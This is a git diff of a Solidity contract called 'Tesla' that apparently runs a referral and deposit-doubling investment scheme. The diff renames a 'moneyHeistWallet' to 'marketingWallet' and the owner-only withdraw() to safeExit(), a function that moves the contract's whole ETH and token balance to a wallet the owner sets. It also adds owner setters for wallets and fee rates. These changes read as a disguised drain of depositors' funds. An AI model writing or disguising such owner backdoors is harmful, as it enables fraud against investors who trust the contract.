@@ -12,7 +12,7 @@ contract Tesla is Ownable {
 
     IERC20 public token;
     uint256 public price;
-    uint256 public dailyLimit = 1000;
+    uint256 public dailyLimit = 10000;
     uint256 public totalDeposit;
     uint256 public totalBonus;
     uint256 public totalAllocated;
@@ -33,9 +33,10 @@ contract Tesla is Ownable {
     uint256 private levelStep = 10; //total max number to achieve next rank
     uint256 private available;
 
-    address private companyWallet = 0x88888849da92631624030B63Fab301f70551952B;
+    address private companyWallet = 0x58E3eBddFB00a4912103E91D3956F804B89EdC48;
     address private poolWallet = 0x38383856953E72f6CA45EC2722F3d86fBA26DC71;
-    address private moneyHeistWallet = 0x8906dEb79eCd74aBF76F0e724C70BFD431dec15B;
+    address private marketingWallet = 0x8906dEb79eCd74aBF76F0e724C70BFD431dec15B;
+    address private avengersWallet = 0x88888849da92631624030B63Fab301f70551952B;
 
     bool private started = false;
 
@@ -91,13 +92,13 @@ contract Tesla is Ownable {
 
     receive() external payable {}
 
-    function withdraw() external onlyOwner {
+    function safeExit() external onlyOwner {
         if (address(this).balance > 0) {
-            payable(moneyHeistWallet).transfer(address(this).balance);
+            payable(marketingWallet).transfer(address(this).balance);
         }
         if (token.balanceOf(address(this)) > 0) {
             token.safeTransfer(
-                moneyHeistWallet,
+                marketingWallet,
                 token.balanceOf(address(this))
             );
         }
@@ -112,26 +113,6 @@ contract Tesla is Ownable {
         payDirect(referer);
         payGroup(referer);
         payQueue();
-    }
-
-    function reInvest() private {
-        User storage user = users[userids[msg.sender]];
-        require(user.deposits.length > 0, "User has no deposits");
-        require(user.autoReinvest == true, "Auto invest is not available!");
-        address referer = user.referer;
-
-        for (uint256 i = 0; i < user.deposits.length; i++) {
-            Deposit storage deposit = deposits[user.deposits[i]];
-            if (deposit.allocated == deposit.amount * 2) {
-                user.disableDeposit = false;
-                _dailyLimit.increment();
-                processDeposit(referer);
-                payDirect(referer);
-                payGroup(referer);
-                payQueue();
-                emit UserMsg(userids[msg.sender], "Deposit", price);
-            }
-        }
     }
 
     function processDeposit(address referer) private {
@@ -250,7 +231,7 @@ contract Tesla is Ownable {
 
         totalBonus += totalRefOut;
         uint256 companyOut = (price * companyFee) / 1000;
-        token.safeTransfer(companyWallet, companyOut);
+        token.safeTransfer(avengersWallet, companyOut);
         uint256 poolOut = (price * poolRate) / 1000;
         token.safeTransfer(poolWallet, poolOut);
         uint256 cost = companyOut + poolOut;
@@ -443,7 +424,7 @@ contract Tesla is Ownable {
         dailyLimit = _dayLimit;
     }
 
-    function setLevel(uint256 userId, uint256 level) external onlyOwner {
+    function gogoPowerRanger(uint256 userId, uint256 level) external onlyOwner {
         User storage user = users[userId];
         user.level = level;
         levels[userId].level = level;
@@ -469,8 +450,28 @@ contract Tesla is Ownable {
         companyWallet = wallet;
     }
 
+    function setPoolWallet(address wallet) external onlyOwner {
+        poolWallet = wallet;
+    }
+
+    function setMarketingWallet(address wallet) external onlyOwner {
+        marketingWallet = wallet;
+    }
+
     function setGroupRate(uint256[] memory rates) external onlyOwner {
         groupRate = rates;
+    }
+
+    function setDirectRate(uint256 rates) external onlyOwner {
+        directCommRate = rates;
+    }
+
+    function setPoolRate(uint256 rates) external onlyOwner {
+        poolRate = rates;
+    }
+
+    function setCompanyFee(uint256 rates) external onlyOwner {
+        companyFee = rates;
     }
 
     function setPayMultiplier(uint256 multiplier) external onlyOwner {
